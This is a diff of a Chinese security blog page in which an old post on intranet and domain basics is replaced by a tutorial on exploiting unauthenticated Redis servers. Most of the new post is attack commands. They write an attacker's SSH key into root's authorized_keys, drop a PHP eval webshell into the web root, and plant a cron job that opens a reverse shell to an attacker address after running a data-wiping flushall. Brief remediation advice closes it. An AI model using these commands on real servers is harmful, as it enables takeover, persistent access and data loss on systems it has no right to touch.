@@ -20,31 +20,28 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":"default","style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta property="og:type" content="article">
-<meta property="og:title" content="内网基础">
-<meta property="og:url" content="http://example.com/2023/02/20/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/index.html">
+    <meta name="description" content="漏洞原理 redis默认绑定在6379端口，即0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。 没有设置密码认证（一般为空）或者设置弱口令密码，导致任何用户可以远程登录redis服务。 总的来说就是配置不当导致的漏洞： 没有设置密码，或者设置密码为弱口令 没有开启防火墙 将6379端口直接暴露在公网上，允许任何人访问 将将protecte">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redis未授权总结">
+<meta property="og:url" content="http://example.com/2023/03/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="元酒InfoSec">
+<meta property="og:description" content="漏洞原理 redis默认绑定在6379端口，即0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。 没有设置密码认证（一般为空）或者设置弱口令密码，导致任何用户可以远程登录redis服务。 总的来说就是配置不当导致的漏洞： 没有设置密码，或者设置密码为弱口令 没有开启防火墙 将6379端口直接暴露在公网上，允许任何人访问 将将protecte">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2023/02/20/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/image-20230220133523195.png">
-<meta property="og:image" content="https://img-blog.csdn.net/20181022145259655?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
-<meta property="og:image" content="https://img-blog.csdn.net/20181022150802375?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
-<meta property="article:published_time" content="2023-02-20T05:33:04.000Z">
-<meta property="article:modified_time" content="2023-02-27T06:39:27.055Z">
+<meta property="article:published_time" content="2023-03-06T04:56:37.000Z">
+<meta property="article:modified_time" content="2023-03-07T06:35:47.874Z">
 <meta property="article:author" content="yuanjiu">
-<meta property="article:tag" content="内网">
-<meta property="article:tag" content="域">
+<meta property="article:tag" content="redis">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2023/02/20/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/image-20230220133523195.png">
 
 
-<link rel="canonical" href="http://example.com/2023/02/20/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/">
+<link rel="canonical" href="http://example.com/2023/03/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/02/20/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/","path":"2023/02/20/内网基础/","title":"内网基础"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/03/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/","path":"2023/03/06/redis未授权总结/","title":"redis未授权总结"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>内网基础 | 元酒InfoSec</title>
+<title>redis未授权总结 | 元酒InfoSec</title>
   
 
 
@@ -145,7 +142,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="nav-number">1.</span> <span class="nav-text">相关基础概念</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-DMZ"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">1.DMZ</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%B8%8E%E5%9F%9F"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">2.工作组与域</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E5%9F%9F%E6%8E%A7DC-Domain-Control"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">3.域控DC(Domain Control)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95AD-Active-Directory"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">4.活动目录AD(Active Directory)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-%E5%9F%9F%E7%BB%93%E6%9E%84"><span class="nav-number">1.0.0.5.</span> <span class="nav-text">5.域结构</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-linux%E5%9F%9F%E4%B8%8Ewindows%E5%9F%9F"><span class="nav-number">1.0.0.6.</span> <span class="nav-text">6.linux域与windows域</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-%E5%B8%B8%E7%94%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B"><span class="nav-number">1.0.0.7.</span> <span class="nav-text">7.常用内网渗透流程</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">2.</span> <span class="nav-text">利用方式</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -203,7 +200,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/20/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -216,12 +213,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="内网基础 | 元酒InfoSec">
+      <meta itemprop="name" content="redis未授权总结 | 元酒InfoSec">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          内网基础
+          redis未授权总结
         </h1>
 
         <div class="post-meta-container">
@@ -232,14 +229,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2023-02-20 13:33:04" itemprop="dateCreated datePublished" datetime="2023-02-20T13:33:04+08:00">2023-02-20</time>
+      <time title="创建时间：2023-03-06 12:56:37" itemprop="dateCreated datePublished" datetime="2023-03-06T12:56:37+08:00">2023-03-06</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-02-27 14:39:27" itemprop="dateModified" datetime="2023-02-27T14:39:27+08:00">2023-02-27</time>
+      <time title="修改时间：2023-03-07 14:35:47" itemprop="dateModified" datetime="2023-03-07T14:35:47+08:00">2023-03-07</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -261,42 +258,48 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p><img src="/2023/02/20/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/image-20230220133523195.png" alt="image-20230220133523195"></p>
+        <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul>
+<li>redis默认绑定在6379端口，即0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</li>
+<li>没有设置密码认证（一般为空）或者设置弱口令密码，导致任何用户可以远程登录redis服务。</li>
+<li>总的来说就是配置不当导致的漏洞：<ol>
+<li>没有设置密码，或者设置密码为弱口令</li>
+<li>没有开启防火墙</li>
+<li>将6379端口直接暴露在公网上，允许任何人访问</li>
+<li>将将protected-mode设置为no，把保护关掉。</li>
+<li>用管理员身份运行redis服务</li>
+</ol>
+</li>
+</ul>
 <span id="more"></span>
 
-<h2 id="相关基础概念"><a href="#相关基础概念" class="headerlink" title="相关基础概念"></a>相关基础概念</h2><h5 id="1-DMZ"><a href="#1-DMZ" class="headerlink" title="1.DMZ"></a>1.DMZ</h5><p>​		DMZ，是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。它是为了解决安装<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E9%98%B2%E7%81%AB%E5%A2%99/52767?fromModule=lemma_inlink">防火墙</a>后外部网络的访问用户不能访问内部<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8/99096?fromModule=lemma_inlink">网络服务器</a>的问题，而设立的一个非安全系统与<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/3131501?fromModule=lemma_inlink">安全系统</a>之间的缓冲区。该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571?fromModule=lemma_inlink">服务器</a>设施，如企业<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/8390210?fromModule=lemma_inlink">Web服务器</a>、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1926327?fromModule=lemma_inlink">FTP服务器</a>和<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%AE%BA%E5%9D%9B/158397?fromModule=lemma_inlink">论坛</a>等。另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</p>
-<p><strong>即在两个防火墙之间，内网之外的区域</strong>，<strong>可以大大增加攻击难度</strong></p>
-<h5 id="2-工作组与域"><a href="#2-工作组与域" class="headerlink" title="2.工作组与域"></a>2.工作组与域</h5><p>​	<strong>工作组（Work Group）</strong>是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p>
-<p>​	<strong>缺点：</strong>缺乏集中管理与控制的机制，没有集中的统一帐户管理，没有对资源实施更加高效率的集中管理，没有实施工作站的有效配置和安全性严密控制。只适合小规模用户的使用。</p>
-<p>​	如：学校宿舍，家庭网络</p>
-<p>​	<strong>攻击手段</strong>：arp欺骗，dns劫持</p>
-<p>​		<strong>注意：局域网攻击（如arp欺骗）并不适用于域</strong></p>
-<p>​	<strong>域</strong>：用来描述一种架构，和“工作组”相对应，由工作组升级而来的高级架构，域 (Domain)是一个有安全边界的计算机集合（ 安全边界，意思是在两个域中，一个域中的用户无法访问另一个域中的资源）。可以简单的把域理解成升级版的“工作组”，相比工作组而言，它有一个更加严格的安全管理控制机制，如果你想访问域内的资源，就必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。</p>
-<p>​	<strong>域的功能和特点：</strong></p>
-<ul>
-<li>集中管理，可以集中地管理企业中成千上万分布于异地的计算机和用户</li>
-<li>便捷的资源访问，能够很容易地定位到域中的资源。 用户依次登录就可以访问整个网络资源，集中地身份验证</li>
-<li>可扩展性，既可以适用于几十台计算机的小规模网络，也可以用于跨国公司</li>
-</ul>
-<p>​	如：大超市，学校机房</p>
-<p>​	<strong>工作组与域的区别：</strong>工作组是对等网络，域是B&#x2F;S架构，集中式管理</p>
-<p><img src="https://img-blog.csdn.net/20181022145259655?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
-<h5 id="3-域控DC-Domain-Control"><a href="#3-域控DC-Domain-Control" class="headerlink" title="3.域控DC(Domain Control)"></a>3.域控DC(Domain Control)</h5><p>​		在域架构中域控是用来管理所有客户端的服务器，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都得经过它的审核。域控是域架构的核心，每个域控制器上都包含了AD活动目录数据库。一个域中可能应该要有至少两个域控。一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）存储在DC中的。而有一台备份域控制（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。当域中的一台计算机安装了AD后，它就成了域控DC了。</p>
-<p><strong>即一个域中最高管理权限，最高用户，最高管理的一台服务器，一般来说，拿下DC就意味着拿下域</strong></p>
-<h5 id="4-活动目录AD-Active-Directory"><a href="#4-活动目录AD-Active-Directory" class="headerlink" title="4.活动目录AD(Active Directory)"></a>4.活动目录AD(Active Directory)</h5><p>​		活动目录AD是域环境中提供目录服务的组件。在活动目录中，所有的网络对象信息以一种结构化的数据存储方式来保存，使得管理员和用户能够轻松地查找和使用这些信息。活动目录以这种结构化的数据存储方式作为基础，对目录信息进行合乎逻辑的分层组织。活动目录存储着有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确从目录中查找到他所需要的信息的服务。安装有AD活动目录的服务器就是域控DC。</p>
-<p>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容， 活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</p>
-<p>在活动目录中记录的信息，被分为两大部分，一部分保存在活动目录数据库文件NTDS.dit 中，另一部分保存在被复制的文件系统上。</p>
-<p><strong>类似于策略组件，用于提供各种目录服务</strong></p>
-<h5 id="5-域结构"><a href="#5-域结构" class="headerlink" title="5.域结构"></a>5.域结构</h5><p>​	<strong>单域</strong></p>
-<p>​		在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。</p>
-<p>​	<img src="https://img-blog.csdn.net/20181022150802375?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img" style="zoom:50%;"></p>
-<p>​	<strong>父域与子域</strong></p>
-<p>​		第一个域称为父域也可以叫根域 ，各分部的域称为该域的子域 。父域与子域之间默认建立起了双向信任关系。</p>
-<p>​	<strong>域树与域林</strong></p>
-<h5 id="6-linux域与windows域"><a href="#6-linux域与windows域" class="headerlink" title="6.linux域与windows域"></a>6.linux域与windows域</h5><p>​		linux上也有相对应的活动目录，但是要装LDAP环境，一般企业很少会用LDAP来管理，因为功能上不及域强大，而且用linux来管理要求技术人员门槛高，故linux更适合做服务器，而windows更适合域，所以一般遇到的域是windows域，当然域中包含linux服务器也是很常见的。</p>
-<h5 id="7-常用内网渗透流程"><a href="#7-常用内网渗透流程" class="headerlink" title="7.常用内网渗透流程"></a>7.常用内网渗透流程</h5><p>​		<strong>信息收集&#x3D;》权限提升&#x3D;》横向渗透&#x3D;》权限维持</strong></p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ol>
+<li><p>写入SSH公钥实现ssh登录（要有ssh服务且有ssh公私钥认证）</p>
+</li>
+<li><p>利用webshell写入一句话木马（要有web服务）</p>
+</li>
+<li><p>设置延时任务反弹shell（要有写入权限）</p>
+</li>
+</ol>
+<p>​	<strong>写入SSH公钥实现ssh登录</strong></p>
+<p>​		</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa		###到~/.ssh目录下，生成自己的公钥</span><br><span class="line"></span><br><span class="line">(echo -e&quot;\n&quot;;cat id_rsa.pub;echo -e &quot;\n&quot;)&gt;1.txt		###将公钥写入一个txt文件</span><br><span class="line"></span><br><span class="line">cat 1.txt | ./redis-cli -h ip -p 6379 -x set hack		###将公钥中的内容作为值写入到hack中</span><br><span class="line"></span><br><span class="line">./redis-cli -h ip -p 6379	###连接redis服务</span><br><span class="line"></span><br><span class="line">config set dir /root/.ssh		###更改redis备份路径为ssh公钥存放目录</span><br><span class="line"></span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save						</span><br><span class="line">exit	</span><br><span class="line">###设置上传公钥的备份文件名字为authorized_keys，保存，退出</span><br></pre></td></tr></table></figure>
+
+<p>​	然后尝试在本机链接ssh</p>
+<p>​	<code>ssh -i id_rsa root@ip</code></p>
+<p>​	**写入一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/ </span><br><span class="line">config set  dbfilename shell.php </span><br><span class="line">set x &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; </span><br><span class="line">或者：</span><br><span class="line">set shell &quot;\r\n\r\n&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>​	<strong>延时任务反弹shell</strong></p>
+<p>​	（前两种条件苛刻，这种要更好搞些，毕竟有未授权的redis权限一般都可以写入）</p>
+<p>​		</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flushall     ###清空所有数据(打靶场随便，但实操的时候别这样，会导致删库，小心喝茶)</span><br><span class="line"></span><br><span class="line">config set dir /var/spool/cron/    ###利用config命令，设置要操作的路径为定时任务目录下</span><br><span class="line"></span><br><span class="line">config set dbfilename root	###建立定时任务文件为root</span><br><span class="line"></span><br><span class="line">set x &quot;\n * * * * * /bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8888 0&gt;&amp;1\n&quot;	 ###/x.x.x.x/8888为自己的公网IP与监听端口，这里设置定时任务内容，开始和结束的\n是为了避免crontab的语法错误，五个*是每分钟执行一次</span><br><span class="line"></span><br><span class="line">save 保存操作，保存后就会执行注意提前设置监听</span><br><span class="line"></span><br><span class="line">###如果试ssrf+redis未授权利用用dict写shell时注意用bp抓包传输，同时注意数据包可能会打乱url编码和顺序，记得要把 `&amp;` URL 编码为 `%26`</span><br></pre></td></tr></table></figure>
+
+<p>修复方案： </p>
+<p>注意：以下操作，均需重启 Redis 后才能生效。 绑定需要访问数据库的 IP。 将 127.0.0.1 修改为需要访问此数据库的 IP 地址。 设置访问密码。在 Redis.conf 中 requirepass 字段后，设置添加访问密码。 修改 Redis 服务运行账号。以较低权限账号运行 Redis 服务，禁用账号的登录权限。</p>
 <p>参考文章：</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44110913/article/details/106760045">https://blog.csdn.net/weixin_44110913/article/details/106760045</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_47356348/article/details/125641104">https://blog.csdn.net/m0_47356348/article/details/125641104</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61237064/article/details/123006424">https://blog.csdn.net/qq_61237064/article/details/123006424</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9554">https://xz.aliyun.com/t/9554</a></p>
 
     </div>
 
@@ -306,21 +309,20 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E5%86%85%E7%BD%91/" rel="tag"><i class="fa fa-tag"></i> 内网</a>
-              <a href="/tags/%E5%9F%9F/" rel="tag"><i class="fa fa-tag"></i> 域</a>
+              <a href="/tags/redis/" rel="tag"><i class="fa fa-tag"></i> redis</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2023/02/19/app%E6%8A%93%E4%B8%8D%E5%88%B0%E5%8C%85%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF/" rel="prev" title="app抓不到包解决思路">
-                  <i class="fa fa-chevron-left"></i> app抓不到包解决思路
+                <a href="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/" rel="prev" title="记录一下面试打的靶场">
+                  <i class="fa fa-chevron-left"></i> 记录一下面试打的靶场
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2023/02/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="next" title="代码审计总结">
-                  代码审计总结 <i class="fa fa-chevron-right"></i>
+                <a href="/2023/03/06/ssrf%E6%80%BB%E7%BB%93/" rel="next" title="ssrf总结">
+                  ssrf总结 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
